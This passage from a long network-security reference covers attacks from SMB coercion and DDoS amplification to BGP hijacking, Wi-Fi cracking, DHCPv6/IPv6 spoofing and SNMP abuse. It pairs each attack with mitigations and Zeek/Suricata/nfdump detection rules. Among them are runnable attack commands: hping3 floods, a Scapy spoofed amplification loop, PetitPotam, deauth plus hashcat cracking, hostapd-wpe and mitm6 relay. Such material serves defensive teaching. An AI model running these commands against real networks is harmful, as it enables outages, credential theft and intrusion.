alert tcp any 445 -> any any (msg:"ET EXPLOIT MS17-010 EternalBlue Response";
  content:"|00 00 00 31 ff|SMB"; depth:9; content:"|fe 53 4d 42|";
  sid:2024217; rev:2;)

# Verify SMBv1 disabled:
# Windows PowerShell:
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
Disable-WindowsOptionalFeature -Online -NoRestart -FeatureName SMB1Protocol

# Linux Samba:
# smb.conf: [global] min protocol = SMB2
```

### Coercion Attacks: PrinterBug, PetitPotam, Coercer

Authentication coercion forces a target machine account to authenticate to the attacker. Combined with relay (Section above), this can compromise domain controllers.

**MS-RPRN PrinterBug (SpoolSample):** The Print Spooler service (`spoolsv.exe`) exposes RpcRemoteFindFirstPrinterChangeNotification(). Any authenticated user can call it to force the target to authenticate to any UNC path.

```bash
# SpoolSample
python3 SpoolSample.py dc01.corp.local attacker.corp.local
# DC's machine account authenticates to attacker (capture with Responder or relay)

# PetitPotam — LSARPC/EFSR coercion (unauthenticated in original version)
python3 PetitPotam.py -u '' -p '' attacker.corp.local dc01.corp.local

# Coercer — multi-method coercion scanner
coercer scan --target dc01.corp.local --listener attacker.corp.local

# Prevention:
# Disable Print Spooler on DCs: Stop-Service -Name Spooler; Set-Service -Name Spooler -StartupType Disabled
# PetitPotam: patch KB5005413, disable EFS if not needed
# Require EPA on all NTLM-accepting services
# Deploy NTLM audit policies → alert on machine account NTLM auth to non-DCs
```

---

## 6. DoS & DDoS Attacks

### Volumetric Attacks: Amplification

Amplification attacks use UDP protocols with small requests that generate large responses. The attacker spoofs the victim's IP as source, and servers send large responses to the victim. Requires BCP38 (ingress filtering) to fail at the attacker's ISP.

| Protocol | Port | Amplification Factor | Query Type |
|---|---|---|---|
| DNS | UDP/53 | 28–54× | ANY |
| NTP | UDP/123 | 556–700× | monlist |
| SSDP | UDP/1900 | 30–75× | M-SEARCH |
| CLDAP | UDP/389 | 46–70× | | 
| Memcached | UDP/11211 | 10,000–51,000× | stats |
| CharGEN | UDP/19 | 358× | - |
| rpcbind | UDP/111 | 10–60× | - |

```bash
# NTP amplification query (test your own servers only)
ntpdc -c monlist <your-ntp-server>   # returns list of last 600 clients
# Prevention: disable monlist: restrict default noquery; restrict -6 default noquery

# Memcached amplification — check for open UDP Memcached
echo -e "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u -q 1 <ip> 11211
# Prevention: bind Memcached to 127.0.0.1, disable UDP: memcached -U 0

# hping3 — packet generation for testing
hping3 -S --flood -V -p 80 target-ip   # SYN flood
hping3 --udp --flood -p 53 target-ip    # UDP flood

# Scapy — amplification simulation
from scapy.all import *
pkt = IP(src="victim-ip", dst="open-resolver")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY"))
send(pkt, loop=1)  # responses go to victim
```

### Protocol Attacks: SYN Flood

TCP SYN flood exploits the three-way handshake. The attacker sends many SYN packets with spoofed source IPs. The server allocates state for each SYN (SYN-RECEIVED state), consuming memory. The half-open connection table fills; legitimate connections are rejected.

```bash
# SYN cookies mitigation (Linux)
sysctl -w net.ipv4.tcp_syncookies=1
# Server sends SYN-ACK with cryptographic cookie in sequence number
# No state allocated until ACK received; cookie validated on ACK

# Tuning TCP backlog:
sysctl -w net.ipv4.tcp_max_syn_backlog=65536
sysctl -w net.core.somaxconn=65536

# Firewall-level SYN proxy (iptables)
iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP

# Detection: Suricata
alert tcp any any -> $HOME_NET any (msg:"Possible SYN Flood";
  flags:S; flow:stateless; threshold: type both, track by_dst, count 1000, seconds 1;
  sid:9000010; rev:1;)

# Netstat: count SYN_RECV states
ss -n state syn-recv | wc -l   # >500 indicates SYN flood
```

### Slowloris & Slow POST

**Slowloris:** Opens many HTTP connections to a web server, sending partial HTTP requests with periodic header updates but never completing. Occupies worker threads until timeout (default: minutes). Single machine can exhaust Apache/nginx worker pool.

```bash
# slowloris.py example (test your own server)
python3 slowloris.py target.com --sockets 200 --sleeptime 10

# Prevention:
# nginx: worker connections + timeouts
# nginx.conf:
events { worker_connections 65536; }
http {
  client_header_timeout 10s;
  client_body_timeout 10s;
  keepalive_timeout 30s;
  limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
  limit_conn conn_limit 20;   # max 20 connections per IP
}
```

**R-U-Dead-Yet (RUDY) / Slow POST:** Sends HTTP POST with large Content-Length header but transmits data one byte per 100+ seconds. Ties up server threads waiting for complete request body.

### DDoS Detection and Mitigation Architecture

```
                    ┌─────────────────────────────┐
Internet            │  BGP Flowspec / RTBH          │ ← Upstream ISP filtering
                    │  Cloudflare Magic Transit     │
                    │  Akamai Prolexic              │
                    │  AWS Shield Advanced          │
                    └─────────────┬───────────────┘
                                  │ Scrubbed traffic
                    ┌─────────────▼───────────────┐
                    │  Anycast POP / Scrubbing     │
                    │  Center                      │
                    └─────────────┬───────────────┘
                                  │
                    ┌─────────────▼───────────────┐
                    │  On-premise:                 │
                    │  NetFlow analysis (ARTEMIS)  │
                    │  Local ACL / rate limiting   │
                    └─────────────────────────────┘
```

**BGP Flowspec (RFC 5575):** Allows propagating traffic filtering rules via BGP. Rules match on src/dst IP, protocol, port, packet length, TCP flags. Upstream ISP drops/rate-limits matching traffic before it reaches your network.

```
# Example Flowspec rule (Juniper)
flow-route ddos-block {
  match {
    destination 203.0.113.0/24;
    protocol udp;
    destination-port 80;
    source-prefix-list attack-sources;
  }
  then {
    discard;
    dscp 0;
  }
}
```

**RTBH (Remotely Triggered Black Hole):** Announce victim IP with community tag that causes upstream ISPs to drop all traffic to that IP. Coarse mitigation — stops DDoS but also blocks legitimate traffic. Use as last resort or with selective RTBH (src-based).

**Netflow DDoS detection:**
```bash
# nfdump — identify top destinations by packet rate (volumetric attack)
nfdump -r /var/flow/nfcapd.* -s dstip/pps -n 20 -o fmt:"%dA %bps %pps %Bytes"

# Identify reflection sources (UDP with large response to spoofed IP)
nfdump -r /var/flow/nfcapd.* \
  'proto udp and bytes > 1400 and dst ip 203.0.113.10' \
  -s srcip/bytes -n 20

# Suricata volumetric detection
alert udp any any -> $HOME_NET any (msg:"Possible UDP Flood";
  threshold: type threshold, track by_dst, count 10000, seconds 1;
  sid:9000020; rev:1;)
```

---

## 7. BGP & Routing Attacks

### BGP Fundamentals for Defenders

BGP (Border Gateway Protocol, RFC 4271) is the internet's inter-domain routing protocol. Key concepts:

- **AS (Autonomous System):** A network under single administrative control with a unique AS number (ASN). Example: AS15169 = Google, AS13335 = Cloudflare
- **Prefix Advertisement:** Each AS announces the IP prefixes it owns via BGP UPDATE messages. Peers propagate these to their peers.
- **Path Selection:** BGP selects best path using attributes: Weight, Local Pref, AS Path length, Origin, MED, eBGP vs iBGP preference, IGP metric
- **Route Propagation:** Customer routes propagate to providers; provider routes propagate to customers. Provider routes should NOT propagate between providers (route leak prevention)

**Defenders need to know:** Any BGP speaker can announce any prefix. Without authentication, your prefix can be hijacked by anyone with a BGP session to any ISP.

### BGP Hijacking Types

**Sub-prefix Hijacking (most effective):**  
Target owns 203.0.113.0/24. Attacker announces 203.0.113.0/25 (more specific). BGP longest-prefix-match means the /25 wins over the /24 for half the address space. Attacker receives traffic for 203.0.113.0–203.0.113.127.

**Exact-prefix Hijacking:**  
Attacker announces exact same prefix as victim. Path selection depends on AS path length, local policy. Some regions prefer attacker route; some prefer legitimate. Traffic is split.

**Route Leak:**  
A multi-homed AS incorrectly redistributes routes learned from one provider to another. Fat finger (misconfiguration) vs. malicious intent.

Notable incidents:
- **AS7007 (1997):** Florida ISP announced 70,000+ routes as /24s covering most of the internet
- **Rostelecom (2020):** Russian ISP AS12389 leaked ~8,800 prefixes belonging to financial institutions, Google, Amazon — lasted ~10 minutes
- **Facebook (2021):** Internal BGP misconfiguration withdrew Facebook's own prefixes from the internet, causing global outage — not an attack, but illustrates BGP fragility

### RPKI — Resource Public Key Infrastructure

RPKI cryptographically links IP prefixes to AS numbers. Route Origin Authorizations (ROAs) are signed objects stating "ASN X is authorized to originate prefix P with max prefix length L."

```
# ROA example (RIPE NCC format):
# Origin AS: 15169 (Google)
# Prefix: 8.8.8.0/24
# Max length: /24
# Validity: 2025-01-01 to 2027-01-01

# Create ROA in your RIR portal (ARIN, RIPE, APNIC, LACNIC, AFRINIC)
# Then configure your routers to perform Route Origin Validation (ROV)
```

**RPKI-invalid drop policy vs. ROV:**
- **ROV (Route Origin Validation):** Mark routes as valid/invalid/unknown, but do not automatically drop invalid
- **Drop RPKI-invalid:** Actually filter routes marked as invalid by RPKI — the gold standard

**BIRD2 RPKI validator configuration:**
```
# Install rtrsub or gortr as RPKI-to-Router (RTR) validator
# gortr: docker run cloudflare/gortr

protocol rpki validator1 {
  roa4 { table r4; }
  roa6 { table r6; }
  remote "127.0.0.1" port 8282;
  retry keep 90;
  refresh keep 900;
  expire keep 172800;
}

roa4 table r4;
roa6 table r6;

function is_valid_rpki() {
  if (roa_check(r4, net, bgp_path.last) = ROA_INVALID) then {
    print "RPKI invalid: ", net, " origin ", bgp_path.last;
    return false;
  }
  return true;
}

filter import_filter {
  if !is_valid_rpki() then reject;
  accept;
}
```

**FRR (Free Range Routing) RPKI:**
```
# frr.conf
router bgp 65001
 bgp rpki
  rpki cache 127.0.0.1 8282 preference 1
 address-family ipv4 unicast
  neighbor UPSTREAM route-map RM-IN in
 exit-address-family

route-map RM-IN deny 10
 match rpki invalid

route-map RM-IN permit 20
```

### IRR Filtering

Internet Routing Registry (IRR) databases (ARIN, RIPE, APNIC, RADB, NTTCOM) store routing policy objects. AS-SET objects define which prefixes an AS or customer AS should originate.

```bash
# Query IRR for legitimate prefixes of an AS
whois -h whois.radb.net -- '-i origin AS15169' | grep route:

# Generate prefix filter from IRR using bgpq4
bgpq4 -4 AS15169 -l AS15169_PREFIXES   # generate prefix-list

# Juniper format:
bgpq4 -J -4 AS15169 -l AS15169_PREFIXES

# Apply generated prefix-list as import filter for BGP peer
# Prevents customer from announcing prefixes not in their IRR records
```

### MANRS — Mutually Agreed Norms for Routing Security

MANRS (https://www.manrs.org) defines four actions for network operators:

1. **Filtering:** Prevent propagation of incorrect routing information (IRR-based prefix filters for customers)
2. **Anti-spoofing:** Prevent IP address spoofing (BCP38 uRPF on customer-facing interfaces)
3. **Coordination:** Maintain up-to-date contact information and coordinate on incidents
4. **Global Validation:** Publish routing data (ROAs) so others can validate your routes

```
# BCP38 — Unicast Reverse Path Forwarding (uRPF)
# Cisco IOS — strict uRPF on customer-facing interfaces
interface GigabitEthernet0/1
 ip verify unicast source reachable-via rx    # strict mode

# Loose mode (for asymmetric routing):
 ip verify unicast source reachable-via any
```

### BGP Monitoring

```bash
# BGPmon — monitor your own prefixes for hijacks
# Sign up at bgpmon.net, configure alerts for your ASN/prefixes

# RIPE RIS Streaming — real-time BGP updates
# Connect to RIS Live WebSocket: wss://ris-live.ripe.net/v1/ws/

# Cloudflare Radar BGP hijack detection
curl "https://api.cloudflare.com/client/v4/radar/bgp/hijacks/events" \
  -H "Authorization: Bearer $CF_TOKEN" \
  -G -d "dateStart=2024-01-01" -d "prefix=203.0.113.0/24"

# Local monitoring with bgpdump + analysis
# Collect BGP feeds from RouteViews / RIPE RIS collectors
# Alert on: new origin AS for your prefix, more-specific announcement of your prefix
# new AS prepending your prefix not matching your IRR policy
```

---

## 8. Wireless Network Attacks

### WPA2-Personal: PMKID Attack

The PMKID attack (Jens Steube, 2018) requires no clients — just an AP association attempt. The PMKID is derived from PMK (the network password), and is broadcast by APs in EAPOL association responses.

**Formula:** `PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)`

```bash
# Step 1: Capture PMKID with hcxdumptool
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Step 2: Convert to hashcat format
hcxpcapngtool -o hashes.22000 capture.pcapng

# Step 3: Crack with hashcat
hashcat -m 22000 hashes.22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hashes.22000 -a 3 ?d?d?d?d?d?d?d?d   # 8-digit brute force

# PMKID vs Traditional Handshake:
# PMKID: No client needed, works immediately upon AP association
# Handshake: Requires client to be present and deauth + re-auth
```

### 4-Way Handshake Capture + Deauth

```bash
# Enable monitor mode
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
# Or: airmon-ng start wlan0

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Send deauth to force client reconnection (triggers new handshake)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Crack captured handshake
aircrack-ng -w rockyou.txt capture-01.cap
# Or with hashcat (faster):
hcxpcapngtool -o hashes.22000 capture-01.cap
hashcat -m 22000 hashes.22000 /usr/share/wordlists/rockyou.txt
```

### WPA3 SAE (Dragonfly) and Dragonblood

WPA3 replaces PSK with SAE (Simultaneous Authentication of Equals) — a balanced PAKE protocol providing forward secrecy. The Dragonblood attacks (CVE-2019-13377, CVE-2019-9494) exploit implementation vulnerabilities:

- **Timing side-channel:** SAE commit frame processing time leaks information about the password encoding curve used, enabling offline dictionary attack
- **Cache-based side-channel:** CPU cache access patterns in SAE crypto operations leak password-derived values
- **Downgrade attacks:** WPA3 APs supporting WPA2 transition mode can be forced back to WPA2 by a rogue AP

**Mitigation:** Patch to WPA3-compliant firmware, disable WPA2/WPA3 mixed mode where possible, use WPA3-only deployments.

### KRACK — Key Reinstallation Attack (CVE-2017-13077)

KRACK abuses the 4-way handshake by replaying handshake messages, causing the client to reinstall an already-in-use key. This resets the nonce, enabling nonce reuse, which breaks WPA2 CCMP/TKIP encryption.

**Impact:** CCMP with nonce reuse allows decryption and replay. TKIP allows injection. Patched in all major platforms by 2018.

### Evil Twin AP & WPA-Enterprise Attacks

**Evil Twin:** Attacker deploys AP with same SSID as legitimate network on higher power. Client deauth from legitimate AP connects to evil twin.

**hostapd-wpe (Wireless Pwnage Edition):** Rogue RADIUS server that accepts any credentials, logging them in plaintext.

```bash
# hostapd-wpe for EAP credential capture
cat /etc/hostapd-wpe/hostapd-wpe.conf:
interface=wlan0
ssid=CorpNetwork
wpa=2
wpa_key_mgmt=WPA-EAP
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=radius_secret

hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Captured credentials appear in /var/log/hostapd-wpe.log
```

**PEAP-MSCHAPv2 downgrade:** Enterprise networks using PEAP-MSCHAPv2 are vulnerable if clients don't validate server certificate. Tool: EAPHammer, hostapd-wpe. Captured MSCHAPv2 challenge/response can be cracked offline (John/hashcat) or passed via relay.

**EAP-TLS certificate validation bypass:** If clients accept any certificate for RADIUS, MitM is trivial. Enforce certificate validation + pin CA in supplicant configuration.

**Prevention:**
```
# Windows Group Policy — enforce server certificate validation
# HKLM\SOFTWARE\Microsoft\MSCHAPv2 — no, use GPO:
# Computer Config → Policies → Windows Settings → Security Settings → 
# Wireless Network (IEEE 802.11) Policies
# → Validate server certificate: enabled, specify trusted CAs, specify server names

# Android/iOS: use certificate pinning in MDM profile
# EAP CA certificate: import corporate CA, validate server name pattern
```

### 802.11 Deauthentication Flood

802.11 management frames (deauth, disassoc) are unauthenticated in WPA2. Attacker sends spoofed deauth frames to disconnect clients.

```bash
# MDK4 — deauth/disassoc flood
mdk4 wlan0mon d -b blacklist.txt   # deauth all clients from listed BSSIDs

# 802.11w PMF (Protected Management Frames) — mitigates deauth attacks
# Require PMF on AP configuration:
# hostapd.conf: ieee80211w=2 (required)
# Client must support PMF (all WPA3 devices, most modern WPA2 devices)

# CVE-2022-47522: Even with 802.11w, "multi-link operation" MitM possible
# Mitigation: 802.11be MLO implementations require updated patches
```

### WIDS — Wireless Intrusion Detection

| Platform | Detection Capabilities |
|---|---|
| Cisco Adaptive wIPS | Rogue AP, deauth flood, PMKID capture, EAP anomalies, ad-hoc networks |
| Zebra AirDefense | Honeypot/evil twin detection, wired-side correlation, RF interference |
| WatchGuard WIPS | Rogue AP auto-containment, SSID spoofing detection, client classification |
| Kismet | Passive monitoring, MAC anomaly detection, open-source |

**Rogue AP detection methods:**
- **Wireless:** Monitor for APs with same SSID as legitimate APs (SSID scanning)
- **Wired correlation:** Rogue APs appear as new MAC addresses on switch ports
- **RF fingerprinting:** Vendor-specific signal characteristics identify non-corporate hardware
- **802.11 probe response analysis:** Legitimate APs have consistent capability sets; rogue APs may differ

---

## 9. Protocol-Specific Attacks

### DHCP Attacks

**Rogue DHCP Server:**  
An unauthorized DHCP server responds to client DISCOVER messages, assigning attacker-controlled gateway and DNS server addresses. All client traffic routed to attacker.

```bash
# Detection: DHCP snooping on switches
# Cisco IOS:
ip dhcp snooping                     # enable globally
ip dhcp snooping vlan 10,20          # per-VLAN
no ip dhcp snooping information option  # remove option 82

interface GigabitEthernet0/1         # uplink / legitimate DHCP server port
 ip dhcp snooping trust              # trusted port

interface GigabitEthernet0/2         # client port
 ip dhcp snooping limit rate 15      # rate-limit DHCP on untrusted ports

show ip dhcp snooping statistics
show ip dhcp snooping binding        # binding table: MAC/IP/VLAN/port
```

**DHCP Starvation:**  
Attacker sends DHCPDISCOVER with random source MACs, exhausting the DHCP pool. Legitimate clients cannot obtain addresses. Tool: `gobbler`, `dhcpstarv`.

```bash
# gobbler — DHCP pool exhaustion
gobbler -i eth0 -s 192.168.1.0 -e 192.168.1.254

# Prevention: Port security (limits MACs per port, reduces exhaustion rate)
# DHCP snooping rate limiting (see above)
```

**DHCPv6 Abuse / MITM6:**  
Windows prefers DHCPv6 over DHCPv4 by default. If an attacker sends DHCPv6 ADVERTISE messages, Windows clients will request IPv6 configuration and use the attacker-provided DNS server for IPv6 DNS queries. Combined with WPAD, this enables MitM without touching IPv4.

```bash
# MITM6 — rogue DHCPv6 + DNS for IPv6
mitm6 -d corp.local -i eth0   # Intercept DHCPv6, spoof DNS for corp.local

# Combine with ntlmrelayx for relay attack
ntlmrelayx.py -6 -t ldaps://dc01.corp.local --add-computer

# Prevention:
# Disable IPv6 if not used: Set-NetAdapterBinding -Name "*" -ComponentID ms_tcpip6 -Enabled $false
# Block DHCPv6 on switches: ACL to block UDP/547 from non-server hosts
# RA Guard (see below)
```

### IPv6 Attacks

**Router Advertisement (RA) Flooding:**  
Attackers send forged IPv6 RA messages claiming to be the default router, providing attacker-controlled DNS server. Windows and Linux clients auto-configure based on RAs.

```bash
# fake_router6 (THC-IPv6 toolkit) — rogue RA
fake_router6 eth0 2001:db8::/64   # claim to be router for this prefix

# RA Guard — prevents unauthorized RAs on access ports (RFC 6105)
# Cisco IOS:
ipv6 nd raguard policy RAGUARD_POLICY
 device-role host          # block RAs from this port

interface GigabitEthernet0/2
 ipv6 nd raguard attach-policy RAGUARD_POLICY

# RA Guard limitations: may not handle fragmented or extension headers
# Supplement with: monitoring for unexpected RA sources in NDR
```

**NDP Spoofing (IPv6 ARP equivalent):**  
Neighbor Discovery Protocol (NDP) replaces ARP in IPv6. ICMPv6 Neighbor Advertisement (NA) messages can be spoofed to redirect traffic. ICMPv6 type 136 (Neighbor Advertisement) with OVERRIDE flag set causes immediate cache update.

**Teredo/6to4 Tunnel Bypass:**  
IPv6 transition mechanisms (Teredo, 6to4, ISATAP) encapsulate IPv6 in UDP/IPv4, potentially bypassing IPv4-only firewalls. An attacker can establish a Teredo tunnel to bypass perimeter controls.

**Prevention:** Block Teredo (UDP/3544), 6to4 (protocol 41), and ISATAP at perimeter. Deploy IPv6-aware firewall rules.

### ICMP Attacks

**ICMP Redirect (see Section 4):** Covered in MitM section.

**Smurf Attack (historical):** Attacker sends ICMP ECHO with spoofed victim source to broadcast address. All hosts reply to victim. Amplification proportional to subnet size. Mitigated by blocking directed broadcasts on routers (`no ip directed-broadcast` on Cisco).

**ICMP Tunneling Detection:**
```bash
# ICMP tunnel example (ptunnel-ng)
# Server: ptunnel-ng -x password
# Client: ptunnel-ng -p server-ip -lp 8080 -da internal-host -dp 22 -x password
# Tunnels TCP (SSH) through ICMP

# Detection signatures:
# Large ICMP payload (>64 bytes): normal ICMP echo is small
# High rate ICMP from single source
# ICMP with data that matches text/binary patterns

# Suricata rule:
alert icmp any any -> any any (msg:"Possible ICMP Tunnel - Large Payload";
  dsize:>200; itype:8; icode:0;
  threshold: type both, track by_src, count 50, seconds 10;
  sid:9000030; rev:1;)

# Zeek:  cat conn.log | zeek-cut proto orig_bytes | awk '$1=="icmp" && $2>1000' | wc -l
```

### SNMP Attacks

**Community String Brute Force:** SNMPv1/v2c use cleartext community strings for authentication. Default strings "public" (read) and "private" (write) are widely known.

```bash
# SNMP community string brute force (onesixtyone)
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.0/24

# SNMPwalk with discovered community string
snmpwalk -v2c -c public 192.168.1.1 .1.3.6.1.2.1.1   # system information
snmpwalk -v2c -c public 192.168.1.1 .1.3.6.1.2.1.4.34  # routing table

# SNMP amplification: snmpbulkwalk with spoofed source → victim receives large response
snmpbulkwalk -v2c -c public <open-snmp-agent> .1

# Prevention:
# Enforce SNMPv3 with auth (SHA) and privacy (AES):
# Cisco IOS:
no snmp-server community public
no snmp-server community private
snmp-server view RESTRICTED iso included
snmp-server group SECURE v3 priv read RESTRICTED
snmp-server user snmpuser SECURE v3 auth sha AuthPass123 priv aes 128 PrivPass456

# ACL to restrict SNMP access:
access-list 10 permit 10.0.1.100   # monitoring server only
snmp-server community RESTRICTED RO 10
```

### Legacy Protocol Credential Interception

**Telnet/FTP/TFTP:** Transmit credentials in plaintext. Network capture trivially yields passwords.

```bash
# Sniff telnet credentials (on MitM position)
tcpdump -i eth0 -A port 23 | grep -i "login\|password\|pass"

# Wireshark: filter tcp.port==23 → Follow TCP Stream
# FTP: filter ftp → see USER and PASS commands in clear

# TFTP enumeration: no authentication, no encryption
atftp --get --remote-file /etc/passwd tftp-server-ip /tmp/passwd

# Prevention:
# Replace Telnet with SSH, FTP with SFTP/FTPS, TFTP with SFTP for network device configs
# Network ACLs to block Telnet/FTP from non-admin hosts
# Alert: IDS signature for Telnet/FTP authentication to network devices
```

### NFS/SMB Misconfiguration

```bash
# NFS — world-readable export detection
showmount -e 192.168.1.10       # list exported filesystems
mount -t nfs 192.168.1.10:/home /mnt/nfs   # mount if no_root_squash set

# SMB null session (anonymous) enumeration
smbclient -N -L //192.168.1.10   # list shares anonymously
smbclient -N //192.168.1.10/C$  # attempt anonymous admin share access

# Detection:
# Windows: Event ID 5140 (share access) with anonymous logon
# Suricata: alert smb any any -> any 445 (msg:"SMB NULL Session"; content:"|00 00 00 00|"; offset:4; depth:4;)

# Prevention: SMB signing, disable null sessions, NFS export with specific IP allowlists
# /etc/exports: /data 192.168.1.0/24(ro,sync,root_squash,all_squash)
```

---

## 10. Network Attack Detection & Hunting

### Zeek Network Security Monitoring

Zeek (formerly Bro) generates structured logs from network traffic. Each protocol has a corresponding log file.

**Key log files:**
| Log | Contents | Key Fields |
|---|---|---|
| conn.log | All connections | orig_h, resp_h, proto, service, duration, orig_bytes, resp_bytes, conn_state |
| dns.log | DNS queries/responses | query, qtype_name, answers, rcode_name, TTLs |
| http.log | HTTP requests | host, uri, method, status_code, user_agent, request_body_len |
| ssl.log | TLS sessions | server_name, subject, issuer, version, cipher, cert_chain_fuids |
| files.log | File transfers | mime_type, filename, total_bytes, md5, sha1 |
| weird.log | Protocol anomalies | name (anomaly type), note |
| notice.log | Zeek notices | category, msg, src, dst |

```bash
# Beaconing detection — C2 check-ins at regular intervals
# Step 1: Extract connections to external IPs, compute intervals
cat conn.log | zeek-cut ts id.orig_h id.resp_h | \
  awk '{print $2, $3, $1}' | sort | \
  awk 'prev==$1" "$2 {printf "%s %s %s\n", $1, $2, $3-prev_ts} 
       {prev=$1" "$2; prev_ts=$3}' | \
  awk '{sum+=$3; count++; if(count>5) print $1, $2, sum/count, count}' | \
  sort -k3 -n | head -20   # low variance = beaconing

# Lateral movement — SMB connections between internal hosts
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service | \
  awk '$3 == 445 && /10\.|172\.|192\.168\./ {print}' | \
  sort | uniq -c | sort -rn | head -20

# New external connection not seen in baseline
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p | \
  awk '!/^10\.|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[01]\.|^192\.168\./ {if($2~/^[0-9]/) print $2}' | \
  sort | uniq -c | sort -rn | head -30

# SSL certificate anomalies
cat ssl.log | zeek-cut server_name issuer | \
  awk '$2 !~ /DigiCert|Let.s Encrypt|Sectigo|GlobalSign|Entrust|VeriSign/' | \
  sort | uniq -c | sort -rn | head -20

# Long HTTP connections (possible Slowloris)
cat conn.log | zeek-cut id.resp_p duration | \
  awk '$1==80 && $2>300 {count++} END {print count, "long HTTP connections"}'
```

### Suricata Rule Writing

Suricata is a multi-threaded IDS/IPS/NSM engine using rules compatible with Snort.

**Rule syntax:**
```
action proto src_ip src_port direction dst_ip dst_port (options)
```

**Key options:**
- `content:"string"` — match byte string
- `pcre:"/regex/flags"` — Perl-compatible regex
- `flow:established,to_server` — match established sessions
- `threshold: type limit, track by_src, count N, seconds S` — rate limiting
- `noalert;` — log but don't alert (for flowbits)
- `flowbits:set,name` — set flowbit for multi-rule detection

```
# DNS tunneling — long subdomain label
alert dns any any -> any any (msg:"DNS Tunneling - Long Subdomain Label";
  dns.query; content:"."; pcre:"/[a-z0-9\-]{40,}\./iR"; 
  threshold: type limit, track by_src, count 5, seconds 60;
  classtype:bad-unknown; sid:9001001; rev:1;)

# NTP monlist amplification response
alert udp any 123 -> any any (msg:"NTP Monlist Amplification Response";
  dsize:>400; content:"|1c 00 00 00|"; offset:0; depth:4;
  threshold: type both, track by_dst, count 50, seconds 10;
  classtype:denial-of-service; sid:9001010; rev:1;)

# Possible ARP spoofing — ARP reply storm
alert arp any any -> any any (msg:"ARP Reply Storm - Possible ARP Spoofing";
  arp.opcode:2;
  threshold: type both, track by_src, count 50, seconds 5;
  classtype:attempted-recon; sid:9001020; rev:1;)

# NTLM relay — authentication to multiple SMB targets
# (Use flowbits across connections — better done in SIEM)
alert smb any any -> $HOME_NET 445 (msg:"SMB NTLM Auth - Possible Relay";
  content:"NTLMSSP"; content:"NTLMSSP_AUTH"; distance:0;
  threshold: type both, track by_src, count 5, seconds 10;
  classtype:policy-violation; sid:9001030; rev:1;)

# BGP prefix withdrawal flood (possible BGP hijack preparation)
alert tcp any any -> any 179 (msg:"BGP Excessive Prefix Withdrawals";
  content:"|ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff|"; # BGP marker
  content:"|00 03|"; offset:18; depth:2;  # WITHDRAW type
  threshold: type both, track by_src, count 100, seconds 60;
  classtype:policy-violation; sid:9001040; rev:1;)

# WPA2 PMKID capture attempt detection (requires wifi monitoring)
# hcxdumptool generates EAPOL with specific patterns
alert tcp any any -> any any (msg:"Possible PMKID Capture Tool"; 
  content:"hcxdumptool"; nocase; 
  classtype:attempted-recon; sid:9001050; rev:1;)
```

### Netflow Hunting with nfdump

```bash
# Install: nfcapd (collector) + nfdump (analysis tool)
# nfcapd -w -D -l /var/flow -p 9995   # collect NetFlow v9 on UDP/9995

# Top talkers by bytes (DDoS victim identification)
nfdump -r /var/flow/nfcapd.202601010000 \
  -s dstip/bytes -n 20 \
  -o fmt:'%dA %bps %Bytes %Flows' \
  "proto udp"

# Beaconing detection via connection regularity (jitter analysis)
nfdump -r /var/flow/nfcapd.* \
  -A srcip,dstip,dstport \
  -s flows/flows -n 10 \
  -o fmt:'%sA %dA %dP %fl %Bytes' \
  "proto tcp and dst net not 10.0.0.0/8" | \
  awk '$4 > 50 && $5 < 10000 {print}'   # many flows, small bytes = beaconing

# New outbound connections (first-seen external IPs)
nfdump -r /var/flow/nfcapd.today -A srcip,dstip \
  "dst not net 10.0.0.0/8 and dst not net 192.168.0.0/16 and src net 10.0.0.0/8" | \
  # Compare against baseline of yesterday's dst IPs
  # New IPs = potential new C2

# Lateral movement — internal SMB (445) connections
nfdump -r /var/flow/nfcapd.* \
  "proto tcp and port 445 and src net 10.0.0.0/8 and dst net 10.0.0.0/8" | \
  awk '{print $1, $3, $4}' | sort | uniq -c | sort -rn | head 20

# DNS amplification (many small requests, large responses, UDP 53)
nfdump -r /var/flow/nfcapd.* \
  -A dstip \
  "proto udp and port 53 and bytes > 500" \
  -s dstip/bytes -n 10
```

### NDR Platforms — Detection Capabilities by Attack Type

| Attack Type | Darktrace | ExtraHop Reveal(x) | Vectra AI | Corelight |
|---|---|---|---|---|
| ARP Spoofing | ARP behavioral anomaly | ARP spoofing detection | — | Zeek arp.log |
| DNS Tunneling | "Unusual DNS" model | DNS tunnel detection | DNS data transfer | Zeek dns.log analytics |
| NTLM Relay | Lateral movement model | NTLM relay detection | Suspicious Kerberos | conn.log + dcerpc |
| DDoS | Volumetric anomaly | DDoS classification | — | conn.log aggregation |
| BGP Hijack | — | — | — | BGP log (custom) |
| C2 Beaconing | Autonomous response | Beaconing ML model | C2 channel detection | conn.log periodicity |
| SMB Enumeration | Scanning model | Service discovery | Reconnaissance | smb.log |
| Evil Twin | — | — | — | Wireless-specific (Corelight Sensor) |

### Packet Capture Strategy

**Full PCAP vs. Flow-only:**
- Full PCAP: Complete forensic capability, very high storage (10Gbps link = ~4.5TB/hour). Use TAP (passive optical/copper tap) for fidelity. SPAN ports drop packets under load.
- NetFlow/IPFIX: Session metadata only (~1% storage overhead). Suitable for baseline, anomaly detection, threat hunting. Cannot reconstruct payloads.
- Selective PCAP: Capture only specific protocols, ports, or triggered by IDS alert (Stenographer, PCAP-over-IP in Suricata, LUA scripts in Zeek).

```bash
